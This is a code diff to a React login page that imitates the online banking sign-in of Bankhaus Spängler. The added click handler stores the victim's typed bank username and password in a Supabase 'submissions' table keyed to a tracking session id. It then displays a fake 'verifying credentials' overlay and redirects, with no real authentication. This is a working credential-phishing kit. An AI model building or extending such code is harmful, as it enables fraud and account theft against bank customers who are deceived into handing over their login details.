@@ -1,8 +1,16 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { X, Info } from "lucide-react";
 import spaenglerBg from "@/assets/spaengler-bg.png";
 
 const BankhausSpaengler = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
@@ -10,6 +18,8 @@ const BankhausSpaengler = () => {
   const [lang, setLang] = useState<"de" | "en">("de");
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="min-h-screen flex flex-col">
       {/* Main */}
       <div
@@ -133,7 +143,18 @@ const BankhausSpaengler = () => {
             <button
               className="w-full py-2 text-white font-semibold rounded-md text-base"
               style={{ backgroundColor: "#43638d" }}
-            >
+            
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}>
               {lang === "de" ? "Weiter" : "Continue"}
             </button>
 
@@ -172,6 +193,7 @@ const BankhausSpaengler = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
